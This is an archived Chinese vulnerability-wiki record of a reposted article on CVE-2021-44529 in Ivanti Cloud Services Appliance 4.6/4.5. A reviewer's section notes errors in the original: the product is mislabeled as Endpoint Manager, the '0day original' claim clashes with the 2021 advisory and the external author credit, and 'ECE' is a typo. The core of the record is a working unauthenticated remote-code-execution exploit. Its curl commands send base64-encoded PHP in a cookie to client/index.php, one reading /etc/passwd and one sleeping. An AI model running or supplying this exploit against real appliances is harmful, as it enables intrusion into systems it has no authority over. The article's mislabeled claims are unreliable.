---
cve: "CVE-2021-44529"
id: "vw-0eba8cdf4313a25b4b44b4d5"
entity_id: "ve-0eba8cdf4313a25b4b44b4d5"
schema_version: "1"
title: "【0day EXP】Ivanti Endpoint Manager 4.6原创命令执行漏洞利用程序"
product: "Ivanti Cloud Services Appliance (CSA)"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CVE-2021-44529"
referenced_identifiers: ""
prerequisites: "脚本明确CSA4.6/4.5 Linux，client/index.php Cookie代码执行"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Ivanti/0day%20EXP%20Ivanti%20Endpoint%20Manager%204.6%E5%8E%9F%E5%88%9B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/XkDn6ATS11_VTNSKo3DtDA"
source_status: "recorded"
---

# 【0day EXP】Ivanti Endpoint Manager 4.6原创命令执行漏洞利用程序

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ivanti Cloud Services Appliance (CSA)
- 本文讨论：CVE-2021-44529
- 版本、权限与配置前提：脚本明确CSA4.6/4.5 Linux，client/index.php Cookie代码执行
- 资料类型：外部EXP转载；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 标题/简介把CSA4.6当Endpoint Manager版本，实际组件错配
- 0day原创标题与2021公告/2022 d7x外部作者署名冲突；漏洞类型ECE拼错
- 没有准确修复构建与未认证机制说明，重复节日装饰噪声

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 补丁/版本与Cookie执行机制待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XkDn6ATS11_VTNSKo3DtDA)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本公众号不承担责任，均由本人自行承担。本公众号中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

  

漏洞说明
----

随着越来越多的企业继续转向混合工作环境，端点安全和管理对于 IT 人员和员工来说前所未有地重要。有了 Ivanti 端点管理器，您就可以放心无忧，因为您知道无处不在的工作空间中的现代设备群尽在掌控。

Ivanti 端点管理器有助于：1) 提高用户和 IT 生产力；2) 使 IT 管理员能够实现设备配置和软件部署的自动化；3) 快速修复用户问题；4) 快速发现设备和软件资产。

**威胁级别：**【严重】

**漏洞类型：**ECE

**影响版本：**

Ivanti Endpoint Manager 4.6

漏洞EXP
-----

```
# Exploit Title: Ivanti Endpoint Manager 4.6 - Remote Code Execution (RCE)  
# Date: 20/03/2022   
# Exploit Author: d7x   
# Vendor Homepage: https://www.ivanti.com/   
# Software Link: https://forums.ivanti.com/s/article/Customer-Update-Cloud-Service-Appliance-4-6   
# Version: CSA 4.6 4.5 - EOF Aug 2021   
# Tested on: Linux x86_64  
# CVE : CVE-2021-44529  
  
###  
This is the RCE exploit for the following advisory (officially discovered by Jakub Kramarz):   
https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US  
  
Shoutouts to phyr3wall for providing a hint to where the obfuscated code relies  
  
@d7x_real  
https://d7x.promiselabs.net  
https://www.promiselabs.net  
###  
  
# cat /etc/passwd  
curl -i -s -k -X $'GET' -b $'e=ab; exec=c3lzdGVtKCJjYXQgL2V0Yy9wYXNzd2QiKTs=; pwn=; LDCSASESSID=' 'https://.../client/index.php' | tr -d "\n" | grep -zPo '<c123>\K.*?(?=</c123>)'; echo  
  
# sleep for 10 seconds  
curl -i -s -k -X $'GET' -b $'e=ab; exec=c2xlZXAoMTApOw==; pwn=; LDCSASESSID=' 'https://.../client/index.php' | tr -d "\n" | grep -zPo '<c123>\K.*?(?=</c123>)'; echo 
```

  





  

  



后台回复“粉丝群”加入公众号粉丝群

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
